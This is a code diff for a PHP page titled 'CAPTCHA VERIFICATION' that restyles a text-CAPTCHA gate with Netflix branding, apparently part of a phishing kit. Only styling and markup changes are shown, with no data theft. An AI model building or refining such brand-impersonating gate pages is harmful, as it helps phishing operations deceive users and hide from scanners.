@@ -15,61 +15,19 @@ error_reporting(E_ALL);
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CAPTCHA VERIFICATION</title>
 
-  <style>
-  body {
-    margin: 0;
-    padding: 10px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    background-color: black; /* Set background color to black */
-    font-family: Arial, sans-serif;
-    color: #fff; /* Text color to white for better contrast */
-  }
+  <style type="text/css">
 
-  #loader-container {
-    text-align: center;
-    color: #fff; /* Text color to white for loader */
+  #userInput.invalid {
+    border: 2px solid darkblue;
   }
-
-  .custom-loader, #main-page-button, input {
-    max-width: 90%; /* Ensures elements do not exceed the screen width */
-  }
-
-  .custom-loader {
-    height: 10px;
-    background-color: #fff;
-    position: relative;
-  }
-
-  .loader-bar {
+body, html {
     height: 100%;
-    background-color: #ff4500;
-    position: absolute;
-    animation: move 2s infinite linear;
-  }
-
-  @keyframes move {
-    0%, 100% { transform: translateX(0); }
-    50% { transform: translateX(80px); }
-  }
-
-  #loader-text {
-    margin-top: 10px;
-    font-size: 1em; /* Responsive font size */
-    color: #fff; /* Text color to white */
-  }
-
-  #input-section, #main-page-content {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    width: 100%; /* Use full container width */
-  }
-
-  input, #main-page-button {
+    margin: 0;
+    background-color: #000;
+    color: white;
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+}
+  input {
     margin-top: 10px;
     padding: 10px;
     width: auto; /* Adjust width based on content */
@@ -89,20 +47,51 @@ error_reporting(E_ALL);
     border: 2px solid darkblue;
   }
 
-  #errorMsg {
-    font-size: 0.8em; /* Responsive font size */
-    color: red; /* Fixed color for better visibility */
-  }
+.captcha-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100%;
+    flex-direction: column;
+    padding: 10px; 
+}
 
-  @media (max-width: 600px) {
-    #main-page-button, input {
-      padding: 8px 20px; /* Adjust padding for smaller screens */
-    }
+.captcha-box {
+    background-color: #141414;
+    padding: 20px;
+    border-radius: 4px;
+    text-align: center;
+    width: 100%;
+    max-width: 400px; 
+}
 
-    #loader-text, #errorMsg {
-      font-size: 0.9em; /* Adjust font size for smaller screens */
+.logo {
+    width: 200px;
+    margin-bottom: 20px;
+}
+
+.verify-button {
+    background-color: #E50914;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    margin-top: 20px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+    width: 100%; 
+}
+
+.verify-button:hover {
+    background-color: #f6121d;
+}
+
+
+@media (max-width: 600px) {
+    .logo {
+        width: 150px; 
     }
-  }
+}
 </style>
 </head>
 <body>
@@ -159,21 +148,28 @@ error_reporting(E_ALL);
 
 
 ?>
-<img src="./nfx.png" alt="Logo" width="350" height="400">
-
-<svg xmlns="http://www.w3.org/2000/svg" width="150" height="100" viewBox="0 0 200 100">
+<div class="captcha-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
+        <div class="captcha-box">
+            <p>Please complete the CAPTCHA to continue:</p>
+            <!-- CAPTCHA widget will go here -->
+            <div class="captcha-widget"><svg xmlns="http://www.w3.org/2000/svg" width="150" height="100" viewBox="0 0 200 100">
         <rect width="100%" height="100%" fill="#eee" />
         <text id="randomStringSpan" x="50%" y="50%" font-size="30" fill="#333" text-anchor="middle" dominant-baseline="middle" font-family="Arial, sans-serif">
         </text>
         <!-- Your SVG content -->
-    </svg>  
-<fieldset class="whiteborder">
-    <legend>Please finish the captcha to proceed</legend>
+    </svg>  </div>
     <div class="fl20"> <input id="userInput" type="text" placeholder="Enter captcha text" />
+                  <button  id="main-page-button" onclick="checkInput()" class="verify-button">Verify</button>
+
         <span id="errorMsg"></span>
-        <button id="main-page-button" onclick="checkInput()">Submit</button></div>
     <div class="clear"></div>
-</fieldset>
+
+
+        </div>
+    </div>
+
+
 
 
 
